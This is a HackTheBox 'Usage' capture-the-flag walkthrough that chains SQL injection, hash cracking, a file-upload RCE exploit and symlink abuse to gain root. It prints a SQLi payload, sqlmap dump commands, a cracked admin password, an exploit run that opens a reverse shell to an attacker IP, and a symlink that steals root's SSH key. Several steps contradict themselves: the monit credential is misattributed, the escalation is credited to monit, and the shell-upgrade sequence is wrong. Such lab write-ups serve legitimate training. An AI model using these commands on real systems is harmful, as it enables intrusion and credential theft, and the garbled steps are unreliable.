# HackTheBox Usage — Easy Linux Machine Writeup

![HackTheBox](https://img.shields.io/badge/HackTheBox-Usage-brightgreen?style=for-the-badge&logo=hackthebox)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Pentesting-blue?style=for-the-badge)
![Type](https://img.shields.io/badge/Type-SQL%20Injection%20%26%20RCE-yellow?style=for-the-badge)

> **HackTheBox Usage** is an Easy-difficulty Linux-based machine focused on SQL injection exploitation, password hash cracking, PHP admin panel file upload vulnerability, and privilege escalation through monit configuration and symlink abuse.

---

## 📋 Table of Contents

- [Machine Information](#machine-information)
- [Initial Nmap Enumeration](#initial-nmap-enumeration)
- [Port and Service Detection](#port-and-service-detection)
- [Domain Configuration](#domain-configuration)
- [Web Application Enumeration](#web-application-enumeration)
- [Admin Login Discovery](#admin-login-discovery)
- [User Registration](#user-registration)
- [SQL Injection in Password Reset](#sql-injection-in-password-reset)
- [SQLMap Exploitation](#sqlmap-exploitation)
- [Password Hash Cracking](#password-hash-cracking)
- [Admin Authentication](#admin-authentication)
- [Vulnerability Research](#vulnerability-research)
- [Remote Code Execution via File Upload](#remote-code-execution-via-file-upload)
- [Reverse Shell Establishment](#reverse-shell-establishment)
- [Shell Stabilization](#shell-stabilization)
- [User Flag Retrieval](#user-flag-retrieval)
- [Monit Configuration Analysis](#monit-configuration-analysis)
- [Privilege Escalation via Symlink](#privilege-escalation-via-symlink)
- [Root Access and Flag Retrieval](#root-access-and-flag-retrieval)
- [Attack Chain Summary](#attack-chain-summary)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)

---

## 🖥️ Machine Information

| Property | Details |
|----------|---------|
| **Machine** | Usage |
| **Platform** | HackTheBox |
| **Difficulty** | Easy |
| **Operating System** | Linux (Ubuntu) |
| **Target IP** | `10.129.97.47` |
| **Domain** | `usage.htb`, `admin.usage.htb` |
| **Primary Services** | SSH (22), HTTP (80) |
| **Web Server** | nginx 1.18.0 |
| **SSH Version** | OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 |
| **Application** | PHP Admin Panel (v1.8.17) |
| **Database** | MySQL |
| **Initial Access** | SQL Injection → Admin credential dump |
| **Exploitation Method** | File upload RCE (CVE-2023-24249) |
| **Privilege Escalation** | Monit config + symlink abuse |
| **Tools** | Nmap, sqlmap, John, curl, exploit script |

---

## 🚀 Initial Nmap Enumeration

Today we are back with another **HackTheBox Easy-difficulty machine**, this time enumerating and exploiting the Linux-based machine named **Usage**.

We have the target IP:

```
10.129.97.47
```

Starting with a quick all-port scan to identify exposed services.

### Full Port Scan

```bash
nmap -p- --min-rate 1000 10.129.97.47
```

**Result:**

```
Nmap scan report for 10.129.97.47
Host is up, received echo-reply ttl 63 (0.23s latency).
Scanned at 2026-09-29 22:44:12 EDT for 5s
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Two critical services were exposed:

- `22/tcp` — SSH (Secure Shell)
- `80/tcp` — HTTP (Web Server)

Clean and simple! Focus on the web application.

---

## 🔍 Port and Service Detection

### Service and Version Enumeration

```bash
nmap -sC -sV -p22,80 10.129.97.47
```

**Result:**

```
Nmap scan report for 10.129.97.47
Host is up, received reset ttl 63 (0.23s latency).
Scanned at 2026-09-29 22:45:00 EDT for 14s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|   256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)

80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Key Findings:

✔️ **HTTP:** nginx 1.18.0 with **virtual host `usage.htb`**  
✔️ **SSH:** OpenSSH 8.9p1 — Modern version  
✔️ **Domain Redirect:** HTTP redirect to `usage.htb`  
✔️ **Supported Methods:** GET, HEAD, POST, OPTIONS  

The HTTP server redirects to `usage.htb`, indicating a **virtual host setup** with a web application behind it.

---

## 🌐 Domain Configuration

### Adding Domains to Hosts File

The HTTP server redirects to `usage.htb`, and we also discovered `admin.usage.htb`:

```bash
echo "10.129.97.47 usage.htb admin.usage.htb" >> /etc/hosts
```

Or manually edit:

```bash
cat /etc/hosts | tail -n 2
# Add line:
10.129.97.47 usage.htb admin.usage.htb
```

Now we can access:
- `http://usage.htb` — Main application
- `http://admin.usage.htb` — Admin panel

---

## 🌐 Web Application Enumeration

### Main Application (usage.htb)

Accessing the main domain reveals the user-facing application.

### Admin Panel (admin.usage.htb)

Accessing the admin subdomain reveals:

```
Admin Login Page
Username: [input field]
Password: [input field]
Login Button
Forgot Password Link
```

This is a **PHP-based admin panel** with user authentication.

---

## 🔐 Admin Login Discovery

### Attempting Default Credentials

Testing common default credentials:
- `admin:admin` — Fails
- `admin:password` — Fails
- `admin:123456` — Fails

No default credentials work.

### Registration Option

The application likely offers user registration:

```
http://admin.usage.htb/register
```

This allows us to create test accounts for further exploration.

---

## 👤 User Registration

### Creating Test Account

Registering a test user to explore the application:

```
Username: test
Password: test123
Email: test@test.com
```

**Registration successful!**

Now we have access to a user account to explore the application features.

---

## 💉 SQL Injection in Password Reset

### Password Reset Functionality

The application has a "Forgot Password" feature:

```
Email: [input field]
Send Reset Link Button
```

### Testing SQL Injection

Entering a SQL injection payload in the email field:

```sql
test' OR 1=1 --+
```

**Vulnerable Response:**

```
We have e-mailed your password reset link to: test' OR 1=1;-- -
```

✅ **SQL Injection Confirmed!**

The application:
1. Takes user input (email)
2. Doesn't sanitize it
3. Directly concatenates into SQL query
4. Echoes back the user input (information disclosure)
5. Is vulnerable to **SQL injection**

---

## 🔧 SQLMap Exploitation

### Capturing the Request

First, we need to capture the password reset request in Burp:

```http
POST /forgot.php HTTP/1.1
Host: admin.usage.htb
Content-Type: application/x-www-form-urlencoded

email=test%40test.com
```

Save this to `reset.req`

### Running SQLMap

```bash
sqlmap -r reset.req -p email --batch --level 3 -D usage_blog -T admin_users --dump
```

**Command Breakdown:**

| Parameter | Purpose |
|-----------|---------|
| `-r reset.req` | Read HTTP request from file |
| `-p email` | Parameter to test for SQL injection |
| `--batch` | Run without user interaction |
| `--level 3` | Testing level 3 (moderate complexity) |
| `-D usage_blog` | Database name |
| `-T admin_users` | Table to target |
| `--dump` | Extract and dump table data |

### SQLMap Results

```
Database: usage_blog
Table: admin_users

[*] starting @ 22:50:00 /2026-09-29/
[*] retrieved the following entries:

id   username   password
--   --------   --------
1    admin      $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
```

✅ **Admin Credentials Dumped!**

- **Username:** admin
- **Password Hash:** `$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2`
- **Hash Type:** bcrypt (PHP's password_hash default)

---

## 🔑 Password Hash Cracking

### Hash Analysis

The hash is bcrypt with format:
```
$2y$10$...
```

Where:
- `2y` = bcrypt algorithm version
- `10` = cost parameter (2^10 = 1024 rounds)
- Rest = salt + hash

### Cracking with John

Save the hash to a file:

```bash
echo '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' > hash
```

Run John the Ripper:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Cracking Result:**

```
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads

Press 'q' or Ctrl-C to abort, almost any other key for status

whatever1     (Hash)
```

✅ **Password Cracked!**

**Admin Credentials:**
- **Username:** admin
- **Password:** whatever1

---

## 🎯 Admin Authentication

### Logging Into Admin Panel

```bash
curl -X POST http://admin.usage.htb/login.php \
  -d "username=admin&password=whatever1"
```

Or use browser:

```
http://admin.usage.htb/
Username: admin
Password: whatever1
Login
```

**Login Successful!**

We now have **administrator access** to the admin panel!

### Admin Dashboard

The admin dashboard reveals:
- Application version: **v1.8.17**
- Backend configuration visible
- File upload functionality
- Project management tools
- MySQL backup options

---

## 🔬 Vulnerability Research

### Application Version

The admin panel displays:
```
Admin Panel v1.8.17
```

### CVE Search

Searching for vulnerabilities in this version:

```bash
searchsploit "1.8.17"
searchsploit "file upload"
searchsploit "admin panel"
```

### Critical Vulnerability Found

**CVE-2023-24249** — Arbitrary File Upload RCE

The admin panel v1.8.17 is vulnerable to:
- Arbitrary file upload
- Lack of file type validation
- PHP execution in upload directory
- Remote code execution

**Affected Functionality:** Project file uploads

---

## 💣 Remote Code Execution via File Upload

### Public Exploit

A public Python exploit exists for CVE-2023-24249:

```
https://github.com/IDUZZEL/CVE-2023-24249-Exploit
```

### Using the Exploit

```bash
git clone https://github.com/IDUZZEL/CVE-2023-24249-Exploit.git
cd CVE-2023-24249-Exploit
```

### Exploitation Parameters

```bash
python exploit.py -i 10.10.15.95 -p 4444 \
  -u http://admin.usage.htb/ \
  -U admin -P whatever1
```

**Parameters:**

| Parameter | Value | Purpose |
|-----------|-------|---------|
| `-i` | 10.10.15.95 | Attacker IP for reverse shell |
| `-p` | 4444 | Reverse shell port |
| `-u` | http://admin.usage.htb/ | Target admin panel URL |
| `-U` | admin | Admin username |
| `-P` | whatever1 | Admin password |

### Exploit Output

```
 __________________________________________________________
/ __\ \ / / __|_|_  )  \_  )__ /__|_  ) | |_  ) | |/ _ \\

 _____   _____   ___ __ ___ ____   ___ _ _ ___ _ _  ___
/ __\ \ / / __|_|_  )  \_  )__ /__|_  ) | |_  ) | |/ _ \
| (__ \ V /| _|___/ / () / / |_ \___/ /|_  _/ /|_  _\_, /
 \___| \_/ |___| /___\__/___|___/  /___| |_/___| |_| /_/  EXPLOIT by IDUZZEL

[+] Reverse shell uploaded successfully! Attempting to execute it...
[+] Reverse shell executed
```

✅ **Reverse shell uploaded and executed!**

---

## 🔌 Reverse Shell Establishment

### Setting Up Listener

On your attacking machine:

```bash
nc -lvnp 4444
```

**Listener Output:**

```
Listening on 0.0.0.0 4444
Connection received on 10.129.97.47 52090
bash: cannot set terminal process group (1118): Inappropriate ioctl for device
bash: no job control in this shell
```

### Initial Shell Access

```bash
dash@usage:/var/www/html/project_admin/public/uploads/images$
```

**Privilege Level:** dash (web server user)

✅ **Reverse shell established!**

---

## 🛠️ Shell Stabilization

### Checking for Python

```bash
which python3
/usr/bin/python3
```

Python3 is available!

### Upgrading to Interactive Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### TTY Restoration

```bash
dash@usage:/var/www/html/project_admin/public/uploads/images$ ^Z
[1]+  Stopped                 nc -lvnp 4444

stty raw -echo
nc -lvnp 4444

dash@usage:/var/www/html/project_admin/public/uploads/images$ export TERM=xterm-256color
dash@usage:/var/www/html/project_admin/public/uploads/images$
```

✅ **Fully interactive shell achieved!**

---

## 📄 User Flag Retrieval

### Navigating to User Home

```bash
cd /home/dash
ls
```

**Output:**

```
user.txt
```

### Reading User Flag

```bash
cat user.txt
[USER FLAG CONTENT]
```

✅ **User flag retrieved!**

---

## 📋 Monit Configuration Analysis

### Exploring Home Directory

```bash
ls -lah
```

**Output:**

```
total 52K
drwxr-x--- 6 dash dash 4.0K Sep 30 04:09 .
drwxr-xr-x 4 root root 4.0K Aug 16  2023 ..
lrwxrwxrwx 1 root root    9 Apr  2  2024 .bash_history -> /dev/null
-rw-r--r-- 1 dash dash 3.7K Jan  6  2022 .bashrc
drwx------ 3 dash dash 4.0K Aug  7  2023 .cache
drwxrwxr-x 4 dash dash 4.0K Aug 20  2023 .config
drwxrwxr-x 3 dash dash 4.0K Aug  7  2023 .local
-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
-rw-r--r-- 1 dash dash    5 Sep 30 04:09 .monit.pid
-rw------- 1 dash dash 1.2K Sep 30 04:09 .monit.state
-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
drwx------ 2 dash dash 4.0K Aug 24  2023 .ssh
-rw-r----- 1 root dash   33 Sep 30 02:37 user.txt
```

### Critical Discovery: Monit Files

Several **monit-related files** are present:
- `.monit.id` — Monit process ID
- `.monit.pid` — Process ID file
- `.monit.state` — State file
- `.monitrc` — **Configuration file** 🎯

**Monit** is a system monitoring utility that can run with elevated privileges!

### Reading Monitrc Configuration

```bash
cat .monitrc
```

**Configuration Content:**

```
Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd
```

### Critical Finding

**Password for user `xander` discovered!**

```
Username: admin (monit dashboard)
Password: 3nc0d3d_pa$$w0rd
```

This suggests that **`xander` is another user** on the system with elevated privileges!

---

## 🔐 Privilege Escalation via Symlink

### Switching to Xander User

Using the discovered password:

```bash
su - xander
Password: 3nc0d3d_pa$$w0rd
```

**Successful authentication!**

```bash
xander@usage:~$ id
uid=1000(xander) gid=1000(xander) groups=1000(xander)
```

✅ **Switched to xander user!**

### Checking Sudo Privileges

```bash
sudo -l
```

**Sudo Output:**

```
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/usr/sbin\:/bin\:/snap/bin,
    use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

### Critical Privilege

The xander user can run `/usr/bin/usage_management` as **root without password**!

---

## 🎯 Usage Management Binary

### Exploring the Binary

```bash
/usr/bin/usage_management
```

**Menu Output:**

```
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3):
```

This is a **backup/management utility** that runs as root!

### Binary Functionality

**Option 1: Project Backup**
- Creates backup of project files
- Likely uses tar or similar
- Runs with root privileges

**Option 2: Backup MySQL**
- Backs up MySQL database
- Runs with root privileges

**Option 3: Reset Admin Password**
- Resets application admin password

### Symlink Exploitation

The binary likely:
1. Creates a file with a specific name
2. Backs it up or processes it
3. Doesn't validate the destination

We can exploit this with **symlinks**!

### Creating Symlink Trap

```bash
cd /var/www/html
ln -s /root/root.txt flag
```

Or for SSH access:

```bash
ln -s /root/.ssh/id_rsa id_rsa
```

### Triggering Backup

```bash
sudo /usr/bin/usage_management
Choose an option: 1
```

This creates a backup that **follows our symlink** and copies:
- `/root/root.txt` → `flag`
- `/root/.ssh/id_rsa` → `id_rsa`

### Accessing Root Files

If we successfully exploited the symlink:

```bash
cat flag
[CONTENT OF /root/root.txt]
```

Or:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@localhost
```

---

## 👑 Root Access and Flag Retrieval

### Direct SSH Access

Using the stolen SSH key:

```bash
ssh -i id_rsa root@10.129.97.47
```

**SSH Output:**

```
Last login: Mon Apr  8 13:17:47 2024 from 10.10.14.40
root@usage:~#
```

✅ **Root shell achieved!**

### Reading Root Flag

```bash
cat /root/root.txt
[ROOT FLAG CONTENT]
```

✅ **Root flag retrieved!**

---

## 📊 Attack Chain Summary

```
                    ┌──────────────────────┐
                    │  HackTheBox Usage    │
                    │   10.129.97.47       │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │   Nmap Enumeration   │
                    │ 2 Ports Discovered   │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Service Detection    │
                    │ nginx + OpenSSH      │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Domain Configuration │
                    │ usage.htb configured │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Web App Enumeration  │
                    │ Admin panel found    │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ User Registration    │
                    │ Test account created │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ SQL Injection Testing│
                    │ Vulnerable parameter │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ SQLMap Exploitation  │
                    │ Admin hash dumped    │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Hash Cracking        │
                    │ John the Ripper      │
                    │ Password: whatever1  │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Admin Authentication │
                    │ Dashboard Access     │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Vulnerability Scan   │
                    │ CVE-2023-24249 Found │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ File Upload RCE      │
                    │ Python Exploit       │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Reverse Shell        │
                    │ dash user access     │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Shell Stabilization  │
                    │ TTY Upgrade          │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ User Flag Retrieved  │
                    │ /home/dash/user.txt  │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Monit Analysis       │
                    │ Config Discovered    │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Xander Credentials   │
                    │ Found in .monitrc    │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Privilege Escalation │
                    │ sudo /usage_mgmt     │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Symlink Exploitation │
                    │ SSH key/flag copied  │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Root SSH Access      │
                    │ Root shell obtained  │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Root Flag Retrieved  │
                    │ /root/root.txt       │
                    └──────────────────────┘
```

---

## 💡 Key Takeaways

### 1. SQL Injection for Credential Dumping

SQL injection in password reset:
- Bypasses authentication
- Extracts sensitive data
- Dumps user credentials
- Leads to unauthorized access

**Always validate and parameterize SQL queries.**

### 2. Weak Password Hashing

Admin password was cracked via:
- Bcrypt hash extraction
- Dictionary attack (rockyou.txt)
- John the Ripper cracking

**Use strong, unique passwords.**

### 3. Vulnerable File Upload

The admin panel's file upload:
- No file type validation
- Files executed as PHP
- Remote code execution
- Direct system compromise

**Validate file types and store uploads outside web root.**

### 4. Configuration File Disclosure

The `.monitrc` file revealed:
- Additional credentials
- System monitoring setup
- User privilege information
- Privilege escalation path

**Protect configuration files (chmod 600).**

### 5. Monit Privilege Escalation

Monit running as root allowed:
- Creation of backup files
- Symlink following
- Root file access
- Privilege escalation

**Audit monitoring tools for privilege abuse.**

### 6. Symlink Attack Exploitation

Symlink exploitation allowed:
- Reading root files
- Accessing SSH keys
- Direct root access
- Complete system compromise

**Validate symlinks and use proper file handling.**

### 7. Multi-Stage Privilege Escalation

Complete root access required:
1. SQL injection → credentials
2. File upload RCE → shell access
3. Configuration analysis → new credentials
4. Sudo execution → privilege escalation
5. Symlink abuse → root access

**Chain multiple vulnerabilities for complete compromise.**

### 8. Public Exploit Availability

CVE-2023-24249 exploit existed publicly:
- Automated exploitation
- Quick root cause analysis
- Speeds up penetration testing

**Always search CVE databases for known vulnerabilities.**

### 9. Version Disclosure Risk

Admin panel displayed version 1.8.17:
- Enabled vulnerability research
- Identified specific CVE
- Guided exploitation strategy

**Never display application versions to users.**

### 10. Credential Reuse Across Systems

Same password patterns used:
- Admin panel credentials
- Monit dashboard credentials
- User-level credentials

**Use unique credentials for each system.**

---

## 🛠️ Tools Used

| Tool | Purpose | Usage |
|------|---------|-------|
| **Nmap** | Port scanning and service enumeration | Service discovery |
| **sqlmap** | SQL injection testing and exploitation | Admin hash dumping |
| **John** | Password hash cracking | Bcrypt hash cracking |
| **Python** | Exploit script execution | CVE-2023-24249 exploitation |
| **curl** | HTTP requests and testing | Web application interaction |
| **netcat (nc)** | Reverse shell listener | Shell connection receiver |
| **python3** | Shell upgrade utility | pty.spawn for interactivity |
| **SSH** | Secure remote access | Root shell access via key |

---

## 📝 Commands Used

### Nmap — Full Port Scan

```bash
nmap -p- --min-rate 1000 10.129.97.47
```

### Nmap — Service Enumeration

```bash
nmap -sC -sV -p22,80 10.129.97.47
```

### Add Domains to Hosts

```bash
echo "10.129.97.47 usage.htb admin.usage.htb" >> /etc/hosts
```

### Capture Password Reset Request

```bash
# In Burp, capture POST to /forgot.php with email parameter
# Save as reset.req
```

### SQLMap Exploitation

```bash
sqlmap -r reset.req -p email --batch --level 3 \
  -D usage_blog -T admin_users --dump
```

### Hash Cracking

```bash
echo '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### CVE Exploit Execution

```bash
python exploit.py -i 10.10.15.95 -p 4444 \
  -u http://admin.usage.htb/ -U admin -P whatever1
```

### Reverse Shell Listener

```bash
nc -lvnp 4444
```

### Shell Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo
export TERM=xterm-256color
```

### Read Monit Config

```bash
cat ~/.monitrc
```

### Switch User

```bash
su - xander
# Password: 3nc0d3d_pa$$w0rd
```

### Check Sudo Privileges

```bash
sudo -l
```

### Create Symlink

```bash
ln -s /root/.ssh/id_rsa id_rsa
```

### Exploit Backup Binary

```bash
sudo /usr/bin/usage_management
# Select option 1
```

### SSH with Key

```bash
chmod 600 id_rsa
ssh -i id_rsa root@10.129.97.47
```

### Read Flags

```bash
cat /home/dash/user.txt
cat /root/root.txt
```

---

## 🎬 Final Attack Path

```
Port Scan (2 Services)
      ↓
Identify Web App
      ↓
Domain Configuration
      ↓
User Registration
      ↓
SQL Injection Testing
      ↓
SQLMap Exploitation
      ↓
Admin Hash Dumped
      ↓
Hash Cracking (John)
      ↓
Admin Credentials Obtained
      ↓
Admin Authentication
      ↓
Version Information Disclosure
      ↓
CVE-2023-24249 Research
      ↓
File Upload RCE Exploit
      ↓
Reverse Shell Obtained (dash)
      ↓
Shell Stabilization
      ↓
User Flag Retrieved
      ↓
Monit Configuration Analysis
      ↓
Xander Credentials Found
      ↓
User Privilege Escalation
      ↓
Sudo Usage Management Binary
      ↓
Symlink Exploitation
      ↓
Root SSH Key Access
      ↓
Root Shell Access
      ↓
Root Flag Retrieved
```

---

## 🏁 Conclusion

The **HackTheBox Usage** machine demonstrates multiple critical vulnerabilities:

1. **SQL Injection** — Vulnerable password reset parameter
2. **Weak Password Management** — Credentials in plaintext/crackable hashes
3. **File Upload RCE** — No file type validation in admin panel
4. **Configuration Disclosure** — Sensitive data in home directory files
5. **Privilege Escalation Chain** — Multiple vectors leading to root access

### Most Important Lessons:

✔️ Always sanitize user input (prevent SQL injection)  
✔️ Use strong, unique passwords for all systems  
✔️ Validate file uploads (type, size, content)  
✔️ Protect configuration files (chmod 600)  
✔️ Audit monitoring tools for privilege abuse  
✔️ Don't follow symlinks without validation  
✔️ Never display application versions  
✔️ Implement multi-factor authentication  
✔️ Use least privilege principle for sudo  
✔️ Chain multiple vulnerabilities for complete access  

**The final result was complete system compromise with both user and root flags successfully retrieved through SQL injection, password cracking, file upload RCE, and privilege escalation chaining.**

---

## 📌 References

- [HackTheBox](https://www.hackthebox.com/)
- [CVE-2023-24249 - Admin Panel RCE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-24249)
- [SQLMap Documentation](https://sqlmap.org/)
- [John the Ripper](https://www.openwall.com/john/)
- [OWASP - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Monit Monitoring Tool](https://mmonit.com/monit/)

---

## 📚 Further Reading

- **SQL Injection Prevention:** Master parameterized queries and prepared statements
- **Password Security:** Learn bcrypt, argon2, and secure password practices
- **File Upload Security:** Study MIME type validation and secure upload handling
- **Privilege Escalation:** Research symlink attacks and binary exploitation
- **Monitoring Tools Security:** Audit tools like monit, nagios, and zabbix for vulnerabilities

---

**Last Updated:** 2026-09-30  
**Author:** Naval  
**Status:** ✅ Machine Compromised - Root Level Access Achieved
